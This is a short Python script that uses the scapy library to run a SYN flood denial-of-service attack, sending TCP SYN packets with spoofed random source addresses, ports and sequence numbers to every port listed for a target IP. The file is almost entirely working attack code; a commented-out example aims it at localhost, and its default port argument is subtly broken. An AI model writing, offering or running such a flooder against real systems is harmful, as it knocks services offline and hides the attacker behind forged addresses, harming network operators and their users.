import random
# Requires scapy and npcap
from scapy.all import IP, TCP, send
from utilities import randInt, randomIP



def SYN_Flood(targetIP, numPackets, ports=[range(3, 65535)]):
    """
    SYN Flood attack function

    Parameters:
    targetIP (str) : IP to run SYN Flood attack on
    numPackets (int) : Number of SYN packets to send to each port
    ports (List[int]) : Optional list of ports to send SYN packets to
    """
    
    # Loop over number of packets to send to each port
    for i in range(numPackets):
        # Generate spoofed TCP packet values
        spoof_port = randInt()
        spoof_eq = randInt()
        spoof_window = randInt()
        
        # Loop over each specified port
        for port in ports:
            # Create spoofed IP packet
            IP_Packet = IP()
            IP_Packet.src = randomIP()
            IP_Packet.dst = targetIP

            # Create spoofed TCP Packet
            TCP_Packet = TCP()	
            TCP_Packet.sport = spoof_port
            TCP_Packet.dport = port
            TCP_Packet.flags = "S"
            TCP_Packet.seq = spoof_eq
            TCP_Packet.window = spoof_window

            # Send spoofed TCP SYN packet
            send(IP_Packet/TCP_Packet, verbose=0)
            print(f"Sent packet to {targetIP}:{port}")

"""
def main():
    SYN_Flood('127.0.0.1', 3, [123, 456])

if __name__ == "__main__":
    main()
"""